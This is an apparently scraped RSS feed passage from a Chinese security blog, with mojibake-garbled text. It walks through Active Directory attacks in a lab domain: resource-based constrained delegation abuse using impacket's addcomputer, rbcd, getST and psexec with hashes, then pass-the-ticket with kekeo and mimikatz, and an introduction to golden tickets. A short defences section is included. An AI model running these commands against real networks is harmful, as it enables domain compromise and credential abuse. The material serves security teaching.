&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/60.png&#34; alt=&#34;60&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœç„¶æ˜¯åœ¨æœ¬æœºæ˜¯ä¸è¡Œçš„ï¼Œå°æ˜æœ€åå€ŸåŠ©äº†æ—è¾¹åŒäº‹çš„ä¸€å°win7è¿›è¡Œæ”»å‡»ï¼ŒæŠŠä¸Šé¢s4uç”³è¯·çš„æœåŠ¡ç¥¨æ®ï¼ˆæœ€åä¸€ä¸²base64ï¼‰æ‹¿åˆ°åŒäº‹è¿™å°win7è¿›è¡Œæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe ptt /ticket:æœ€åä¸€ä¸²base64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”¨åŒäº‹çš„ä¸»æœºè®¿é—®win7aä¸»æœºé‡Œé¢åŸŸç®¡ç†çš„æ–‡ä»¶å¤¹æˆåŠŸï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/66.png&#34; alt=&#34;66&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æƒ…æ™¯äºŒ&#34;&gt;æƒ…æ™¯äºŒ&lt;/h3&gt;
&lt;p&gt;å°æ™ºè¯·æ¥çš„é»‘å®¢å¼€å§‹ä½¿ç”¨kaliè¿›è¡Œæ“ä½œï¼Œè¿™ä¸ªå·¥å…·æ˜¯&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;impacket&lt;/a&gt;ä¸Šçš„ï¼Œå†…ç½®åœ¨kaliï¼Œé¦–å…ˆæ˜¯åˆ›å»ºä¸€å°æœºå™¨ï¼Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;addcomputer.py -dc-ip 172.16.0.106  -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;gongjuren$&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;m&#34;&gt;123456&lt;/span&gt; hack.lab/lucky -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå¯ä»¥ç”¨å¯†ç ï¼Œ domain.local/username[:password]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ·»åŠ æˆåŠŸï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/61.png&#34; alt=&#34;61&#34;&gt;&lt;/p&gt;
&lt;p&gt;å°†gongjurençš„ä¿¡æ¯å†™å…¥win7açš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼Œrbcd.pyä¹Ÿæ˜¯impacketé‡Œé¢çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rbcd.py -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;gongjuren$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;win7a$&amp;#39;&lt;/span&gt; -dc-ip 172.16.0.106 -action write hack.lab/lucky -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†™å…¥æˆåŠŸï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/62.png&#34; alt=&#34;62&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¼ªé€ ç¥¨æ®,getST.pyä¹Ÿæ˜¯å†…ç½®åœ¨kaliçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getST.py -spn cifs/win7a -impersonate administrator -dc-ip 172.16.0.106 hack/gongjuren&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;:123456
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”³è¯·ç¥¨æ®æˆåŠŸï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/63.png&#34; alt=&#34;63&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®¾ç½®KRB5CCNAMEç¯å¢ƒå˜é‡å¹¶ä½¿ç”¨psexec.pyè¿æ¥win7aï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;administrator.ccache
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psexec.py win7a -dc-ip 172.16.0.106 -k -no-pass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æˆ‘hostsæ–‡ä»¶è®¾ç½®äº†172.16.0.105 win7a,ä¹Ÿå¯ä»¥æ¢æˆip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆåŠŸæ‹¿åˆ°win7açš„æƒé™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/64.png&#34; alt=&#34;64&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ä»–æœ‹å‹ä¸å¯èƒ½ä¸€ç›´å¸®ä»–æ¥å…¥å†…ç½‘æƒé™ç»´æŒï¼Œæ‰€ä»¥ç»™ä»–ä¸€å¼ ç¥¨æ®è®©å°æ™ºä¹Ÿå¯ä»¥åœ¨ä»–æœ¬æœºæŸ¥çœ‹win7açš„æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯åœ¨å°æ™ºçš„SQLä¸»æœºä¸Šä½¿ç”¨çš„mimikatzæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &amp;#34;kerberos::ptc administrator.ccache&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/65.png&#34; alt=&#34;65&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°æ™ºå°±è‡ªå·±å°±å¯ä»¥è®¿é—®åˆ°win7açš„ä¸»æœºæ–‡ä»¶äº†ï¼Œé»‘å®¢æœ‹å‹è¿˜æ•™äº†ä»–ä½¿ç”¨Rubeusé‡æ–°ç”³è¯·ç¥¨æ®ï¼Œè¿™æ ·å°±ä¸æ€•ç¥¨æ®å¤±æ•ˆäº†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x04-é˜²å¾¡æªæ–½&#34;&gt;0x04 é˜²å¾¡æªæ–½&lt;/h1&gt;
&lt;p&gt;é˜²å¾¡æªæ–½çš„çš„è¯ï¼Œå› ä¸ºå§”æ´¾æ¯”è¾ƒå®ç”¨æˆ‘ä»¬ä¹Ÿä¸èƒ½è¯´ç›´æ¥ç®€å•ç²—æš´å…³é—­è¯¥åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€äº›é«˜æƒé™ç”¨æˆ·ä¸ºæ•æ„Ÿè´¦æˆ·&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/67.png&#34; alt=&#34;67&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Windows 2012 R2åŠæ›´é«˜çš„ç³»ç»Ÿå»ºç«‹äº†å—ä¿æŠ¤çš„ç”¨æˆ·ç»„ï¼Œç»„å†…ç”¨æˆ·ä¸å…è®¸è¢«å§”æ´¾ï¼Œè¿™æ˜¯æœ‰æ•ˆçš„æ‰‹æ®µã€‚å—ä¿æŠ¤çš„ç”¨æˆ·ç»„ï¼Œå½“è¿™ä¸ªç»„å†…çš„ç”¨æˆ·ç™»å½•æ—¶ï¼ˆwindows 2012 R2åŸŸæœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯å¿…é¡»ä¸ºWindows 8.1æˆ–ä¹‹ä¸Šï¼‰ï¼Œä¸èƒ½ä½¿ç”¨NTLMè®¤è¯ï¼›é€‚ç”¨äºWindows Server 2016ã€Windows Server 2012 R2ã€ Windows Server 2012
3.ä¸€èˆ¬TGT 4å°æ—¶åå¤±æ•ˆ&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;4.Kerberosé¢„è®¤è¯æ—¶ä¸ä½¿ç”¨DESæˆ–è€…RC4ç­‰åŠ å¯†ç®—æ³•ï¼›&lt;/p&gt;
&lt;h1 id=&#34;0x05-ç»“å°¾&#34;&gt;0x05 ç»“å°¾&lt;/h1&gt;
&lt;p&gt;æ•´ä¸ªæ¼æ´ä¸‹æ¥è¿˜æ˜¯æ¯”è¾ƒå¤šå†…å®¹çš„ï¼Œè¿˜æœ‰å¾ˆå¤šCVEæ¼æ´æˆ–è€…æ˜¯å¾ˆå¤šç»†èŠ‚è¿˜æ²¡å†™å…¨ï¼Œç¯‡å¹…å¤ªé•¿äº†ï¼Œåé¢ä¼šå•ä¸ªæ¼æ´å†™ï¼Œè¿™æ ·å°±ä¸ä¼šæ˜¾å¾—æ–‡ç« å¤ªå†—é•¿äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¸ˆå‚…ä»¬å¦‚æœæœ‰é—®é¢˜è¯·æŒ‡ç‚¹ï¼Œå¤šäº¤æµï¼Œæ–‡ç¬”ä¸æ˜¯å¾ˆå¥½ï¼Œå¤§ä½¬ä»¬è§è°…å“ˆï½&lt;/p&gt;
&lt;h1 id=&#34;å‚è€ƒ&#34;&gt;å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;http://woshub.com/decoding-ad-useraccountcontrol-value/&#34;&gt;http://woshub.com/decoding-ad-useraccountcontrol-value/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m365internals.com/2021/05/22/how-to-hunt-for-ldap-reconnaissance-within-m365-defender/&#34;&gt;https://m365internals.com/2021/05/22/how-to-hunt-for-ldap-reconnaissance-within-m365-defender/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/s/video/BV1UQ4y1S7jM&#34;&gt;https://www.bilibili.com/s/video/BV1UQ4y1S7jM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/&#34;&gt;https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7217&#34;&gt;https://xz.aliyun.com/t/7217&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/car7n/p/14789004.html&#34;&gt;https://www.cnblogs.com/car7n/p/14789004.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/620/&#34;&gt;https://paper.seebug.org/620/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.crisprx.top/archives/429&#34;&gt;https://www.crisprx.top/archives/429&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7217&#34;&gt;https://xz.aliyun.com/t/7217&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://daiker.gitbook.io/windows-protocol/kerberos/&#34;&gt;https://daiker.gitbook.io/windows-protocol/kerberos/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2931&#34;&gt;https://xz.aliyun.com/t/2931&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1646184652&amp;amp;ver=3651&amp;amp;signature=Op78cNj8DMI094Nq9Jybu3JMv1zbGGcr*iY*mrBeikoMxGN0wtLkOPHZg0KqRgTVzLICHraR2RRdAiY68xlEOyyo*5W6looqhAmBNLjiMRRjuHykxPgC-0WF3ct9D6KY&amp;amp;new=1&#34;&gt;åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1899592&#34;&gt;https://cloud.tencent.com/developer/article/1899592&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd&#34;&gt;https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie&#34;&gt;https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-ç¥¨æ®ä¼ é€’æ”»å‡»ï¼ˆPass the Ticketï¼‰</title>
      <link>https://xxe.icu/ad_ptt.html</link>
      <pubDate>Mon, 28 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_ptt.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;ç¥¨æ®ä¼ é€’ï¼ˆPass the Ticketï¼ŒPTTï¼‰ï¼Œä½¿ç”¨ Kerberosç¥¨æ®è¿›è¡Œå†…ç½‘æ¨ªå‘ï¼Œä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚æ¯”å¦‚ä¹‹å‰ä¸€ç¯‡æ–‡ç« ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xxe.icu/posts/ad_pass_key/&#34;&gt;åŸŸæ¸—é€-å“ˆå¸Œä¼ é€’æ”»å‡»(Pass the Hash/Key)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x01-ç®€ä»‹&#34;&gt;0x01 ç®€ä»‹&lt;/h1&gt;
&lt;p&gt;ç¥¨æ®ä¼ é€’æ”»å‡»æ”»å‡»ç‚¹éƒ½æ˜¯å‡ºç°åœ¨kerberosè®¤è¯ä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆ‘ä»¬éœ€è¦çŸ¥é“çš„kerberosåŸºæœ¬åŸç†ï¼Œå¯ä»¥æŸ¥é˜…å¦å¤–ä¸€ç¯‡æ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt; è¿›è¡Œå­¦ä¹ ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆè¦äº†è§£ä¸€äº›åŸºç¡€çš„æ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KDCï¼ˆKey Distribution Centerï¼‰= å¯†é’¥åˆ†å‘ä¸­å¿ƒ&lt;/li&gt;
&lt;li&gt;ASï¼ˆAuthentication Serviceï¼‰= è®¤è¯ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸ºå…¶å‘æ”¾TGTçš„æœåŠ¡&lt;/li&gt;
&lt;li&gt;TGTï¼ˆTicket Granting Ticketï¼‰= TGTè®¤è¯ç¥¨æ®ï¼Œç”±ASæœåŠ¡å‘æ”¾ï¼Œå­˜å‚¨åœ¨å†…å­˜ï¼Œé»˜è®¤æœ‰æ•ˆæœŸä¸º10å°æ—¶&lt;/li&gt;
&lt;li&gt;TGSï¼ˆTicket Granting Serviceï¼‰= ç¥¨æ®å‘æ”¾æœåŠ¡&lt;/li&gt;
&lt;li&gt;STï¼ˆService Ticketsï¼‰= STæœåŠ¡ç¥¨æ®ï¼Œç”±TGSæœåŠ¡å‘é€&lt;/li&gt;
&lt;li&gt;APï¼ˆApplication Serverï¼‰= æä¾›ç”¨æˆ·æ‰€éœ€çš„æœåŠ¡&lt;/li&gt;
&lt;li&gt;é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰= ä½¿ç”¨åŸŸè´¦å·krbtgtçš„NTLM Hashè¿›è¡ŒåŠ å¯†&lt;/li&gt;
&lt;li&gt;ç™½é“¶ç¥¨æ® ï¼ˆSilver Ticketï¼‰= ä½¿ç”¨æœåŠ¡è´¦æˆ·çš„NTLM Hashè¿›è¡ŒåŠ å¯†&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;0x02-ç¥¨æ®ä¼ é€’&#34;&gt;0x02 ç¥¨æ®ä¼ é€’&lt;/h1&gt;
&lt;h2 id=&#34;åŸºæœ¬åŸç†&#34;&gt;åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;ç¥¨æ®ä¼ é€’æ˜¯æŠŠå†…å­˜ä¸­çš„TGTå’ŒSTç¥¨æ®è¿›è¡Œè®¤è¯ï¼Œè·å–è¿œç¨‹æœåŠ¡çš„è®¿é—®æƒé™ã€‚æ¯”å¦‚æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªåŸŸç”¨æˆ·å’ŒåŸŸæ§çš„NTLMï¼Œå¤§å®¶éƒ½çŸ¥é“ä½¿ç”¨PTHï¼ˆPass the hashï¼‰ä½¿ç”¨mimikatzéƒ½éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™æ‰å¯ä»¥æ“ä½œï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨impacketé‡Œé¢çš„å·¥å…·ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨pttåŠŸèƒ½è¿›è¡Œç¥¨æ®ä¼ é€’ï¼Œæ‹¿åˆ°åŸŸæ§çš„æƒé™ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜&#34;&gt;å®æˆ˜&lt;/h2&gt;
&lt;p&gt;ç¯å¢ƒæ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;172.16.0.105ï¼šæ™®é€šåŸŸç”¨æˆ·æƒé™ï¼ŒWindows 7&lt;/p&gt;
&lt;p&gt;172.16.0.106ï¼šåŸŸæ§æœåŠ¡å™¨,åŸŸç®¡ç†ç”¨æˆ·testuser&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨Windows 7æ‹¿åˆ°äº†åŸŸç®¡ç†å‘˜testuserçš„NTLMï¼Œä½†æ˜¯æ²¡æœ‰æœ¬åœ°ç®¡ç†å‘˜çš„æƒé™ã€‚è¦ä½¿ç”¨kekeoæ‰å¯ä»¥ç”³è¯·TGTï¼Œmimikatzæ‰¾ä¸åˆ°è¿™ä¸ªåŠŸèƒ½ï¼Œä½†æ˜¯mimikatzæœ‰pttçš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä½¿ç”¨&lt;a href=&#34;https://github.com/gentilkiwi/kekeo&#34;&gt;kekeo&lt;/a&gt;è¿›è¡Œæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;kekeo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tgt::ask /user:testuser /domain:hack.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œåä¼šåœ¨å½“å‰çš„ç›®å½•ä¸Šç”Ÿæˆä¸€ä¸ªåç¼€ä¸º&lt;code&gt;kirbi&lt;/code&gt;çš„ç¥¨æ®æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¯¥ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­æ‰å¯ä»¥ç”Ÿæ•ˆã€‚&lt;/p&gt;
&lt;p&gt;å…ˆä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦æ¸…ç†ç¥¨æ®çš„å‘½ä»¤ï¼Œè¦ä¸ç„¶ä¼šå‡ºç°é”™è¯¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;klist purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°†ç¥¨æ®æ–‡ä»¶å¯¼å…¥å†…å­˜æœ‰ä¸¤ç§æ–¹æ³•ï¼Œéƒ½æ˜¯ä¸éœ€è¦ç®¡ç†å‘˜æƒé™&lt;/p&gt;
&lt;p&gt;kekeoï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;kekeo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;kerberos::ptt TGT_testuser@HACK.LAB_krbtgt~hack.lab@HACK.LAB.kirbi&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mimikatz:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ptt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lucky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TGT_testuser&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@HACK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LAB_krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lab&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@HACK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;LAB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;kirbi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯¼å…¥åæˆ‘ä»¬å†å°è¯•è¿œç¨‹è®¿é—®åŸŸæ§çš„æ–‡ä»¶å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ‰åŒå­¦è¯´éƒ½æœ‰åŸŸæ§ç®¡ç†å‘˜çš„NTLMäº†ï¼Œè¿™ä¸æ˜¯è„±è£¤å­æ”¾å±å˜›ï½å“ˆå“ˆå“ˆï¼Œé‡ç‚¹åœ¨ç¥¨æ®ä¼ é€’&lt;/p&gt;
&lt;h1 id=&#34;0x03-é»„é‡‘ç¥¨æ®golden-ticket&#34;&gt;0x03 é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰&lt;/h1&gt;
&lt;h2 id=&#34;åŸºæœ¬åŸç†-1&#34;&gt;åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;ä¹‹å‰å¯¹é»„é‡‘ç¥¨æ®çš„ç†è§£å°±æ˜¯ï¼šæ‹¿åˆ°krbtgtçš„å¯†ç Hashï¼Œç„¶åç”Ÿæˆä»»ä½•æƒé™çš„ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;è¯¶ï¼Ÿè¦æ‹¿åˆ°åŸŸç®¡ç†å‘˜æƒé™å•Šï¼Œå°±æ˜¯è¦æœ‰åŸŸç®¡ç†å‘˜æƒé™æ‰å¯ä»¥æ‹¿åˆ°krbtgtçš„Hashï¼Œé‚£ä¸å°±è„±è£¤å­æ”¾å±å˜›ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é»„é‡‘ç¥¨æ®åœ¨åŸŸæ¸—é€ä¸­ç»å¸¸ç”¨æ¥åšåé—¨ï¼Œå•Šè¿™ï¼Œé‚£æ²¡äº‹äº†ï½&lt;/p&gt;
&lt;p&gt;é»„é‡‘ç¥¨æ®å½“ä½ åŸŸç®¡ç†çš„æƒé™æ‰äº†æˆ–è€…å¯†ç è¢«æ”¹äº†çš„æ—¶å€™å°±å¾ˆæœ‰ç”¨ã€‚&lt;/p&gt;
